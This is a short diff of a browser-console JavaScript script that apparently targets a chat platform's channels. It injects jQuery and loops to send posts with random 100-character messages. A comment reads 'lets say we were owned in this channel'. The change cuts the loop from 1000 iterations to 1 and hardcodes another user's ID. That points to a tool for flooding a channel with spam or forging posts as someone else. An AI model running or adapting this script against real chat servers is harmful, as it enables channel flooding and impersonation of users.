@@ -15,7 +15,7 @@ var jquery = document.createElement('script');
 jquery.src = 'https://code.jquery.com/jquery-2.2.1.min.js';
 document.head.appendChild(jquery);
 
-for(var i = 0; i < 1000; i++)
+for(var i = 0; i < 1; i++)
 {
 	// lets say we were owned in this channel
 	var data = {
@@ -23,7 +23,7 @@ for(var i = 0; i < 1000; i++)
 		"message": makeid(100),
 		"channel_id": channel,
 		"pending_post_id": Math.random().toString(36).substring(7),
-		"user_id": "",
+		"user_id": "w6tj384ui788jfani5m5i6ws6a",
 		"create_at":1,
 		"state":"loading"
 	};
